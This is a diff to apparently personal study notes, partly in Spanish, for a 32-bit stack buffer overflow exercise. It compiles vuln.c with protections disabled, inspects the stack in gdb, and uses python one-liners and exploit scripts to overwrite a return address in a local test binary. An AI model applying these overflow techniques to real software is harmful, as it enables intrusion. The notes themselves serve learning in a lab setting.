@@ -1,3 +1,6 @@
+gcc -g -m32 -no-pie -fomit-frame-pointer -fno-stack-protector vuln.c -o vuln
+
+
 gdb:
 display/16xw $sp
 
@@ -5,8 +8,9 @@ run <<< $(python3 -c "print('A'*44)")
 
 run <<< $(python3 -c "print('A'*44 + 'B'*4)")
 
-run <<< $(python3 -c "print('A'*44 + 'Ò')")
+run <<< $(python3 -c "print('A'*44 + b'\x08\x92\x04\x08')")
 
+python3 -c "import sys; sys.stdout.buffer.write('A'*44 + b'\x08\x92\x04\x08')"
 
 direcciones:
 
@@ -30,3 +34,5 @@ python3 -c "import sys; sys.stdout.buffer.write(b'ps\x00' + b'A'*41 + b'\x08\x92
 (python3 exploit_sc.py; cat) | ./vuln
 
 REDIRECTION: line 2190 of man bash
+
+(python3 exploit_c.py 0x08049208 0x0804c040; cat) | ./vuln
